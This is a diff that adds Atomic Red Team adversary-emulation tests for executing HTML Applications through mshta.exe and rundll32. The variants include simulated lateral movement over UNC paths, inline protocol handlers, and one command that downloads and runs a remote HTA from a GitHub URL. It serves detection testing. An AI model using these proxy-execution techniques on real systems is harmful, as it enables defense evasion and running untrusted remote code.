@@ -51,3 +51,161 @@ atomic_tests:
     cleanup_command: |
       remove-item "#{temp_file}" -ErrorAction Ignore
     name: powershell
+
+- name: Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement
+  description: Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.
+  supported_platforms:
+  - windows
+  input_arguments:
+    script_engine:
+      description: Script Engine to use
+      type: string
+      default: JScript
+    hta_file_path:
+      description: HTA file name and or path to be used
+      type: string
+      default: Test.hta
+    mshta_file_path:
+      description: Location of mshta.exe
+      type: string
+      default: $env:windir\system32\mshta.exe
+  dependencies:
+  - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
+    prereq_command: |-
+      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+      if (-not $RequiredModule) {exit 1}
+      if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+    get_prereq_command: |
+      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
+  executor:
+    command: 'Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}'
+    name: powershell
+
+- name: Invoke HTML Application - Jscript Engine Simulating Double Click
+  description: Executes an HTA Application using JScript script engine simulating double click.
+  supported_platforms:
+  - windows
+  input_arguments:
+    script_engine:
+      description: Script Engine to use
+      type: string
+      default: JScript
+    hta_file_path:
+      description: HTA file name and or path to be used
+      type: string
+      default: Test.hta
+  dependencies:
+  - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
+    prereq_command: |-
+      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+      if (-not $RequiredModule) {exit 1}
+      if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+    get_prereq_command: |
+      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
+  executor:
+    command: 'Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick'
+    name: powershell
+
+- name: Invoke HTML Application - Direct download from URI
+  description: Executes an HTA Application by directly downloading from remote URI.
+  supported_platforms:
+  - windows
+  input_arguments:
+    mshta_file_path:
+      description: Location of mshta.exe
+      type: string
+      default: $env:windir\system32\mshta.exe
+    hta_uri:
+      description: URI to HTA
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta
+  dependencies:
+  - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
+    prereq_command: |-
+      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+      if (-not $RequiredModule) {exit 1}
+      if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+    get_prereq_command: |
+      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
+  executor:
+    command: 'Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}'
+    name: powershell
+
+- name: Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler
+  description: Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.
+  supported_platforms:
+  - windows
+  input_arguments:
+    rundll32_file_path:
+      description: Location of rundll32.exe
+      type: string
+      default: $env:windir\system32\rundll32.exe
+    script_engine:
+      description: Script Engine to use
+      type: string
+      default: JScript
+    protocol_handler:
+      description: Protocol Handler to use
+      type: string
+      default: About
+  dependencies:
+  - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
+    prereq_command: |-
+      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+      if (-not $RequiredModule) {exit 1}
+      if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+    get_prereq_command: |
+      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
+  executor:
+    command: 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}'
+    name: powershell
+
+- name: Invoke HTML Application - JScript Engine with Inline Protocol Handler
+  description: Executes an HTA Application with JScript Engine and Inline Protocol Handler.
+  supported_platforms:
+  - windows
+  input_arguments:
+    mshta_file_path:
+      description: Location of mshta.exe
+      type: string
+      default: $env:windir\system32\mshta.exe
+    script_engine:
+      description: Script Engine to use
+      type: string
+      default: JScript
+    protocol_handler:
+      description: Protocol Handler to use
+      type: string
+      default: About
+  dependencies:
+  - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
+    prereq_command: |-
+      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+      if (-not $RequiredModule) {exit 1}
+      if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+    get_prereq_command: |
+      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
+  executor:
+    command: 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}'
+    name: powershell
+
+- name: Invoke HTML Application - Simulate Lateral Movement over UNC Path
+  description: Executes an HTA Application with Simulate lateral movement over UNC Path.
+  supported_platforms:
+  - windows
+  input_arguments:
+    mshta_file_path:
+      description: Location of mshta.exe
+      type: string
+      default: $env:windir\system32\mshta.exe
+  dependencies:
+  - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
+    prereq_command: |-
+      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+      if (-not $RequiredModule) {exit 1}
+      if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+    get_prereq_command: |
+      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
+  executor:
+    command: 'Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}'
+    name: powershell
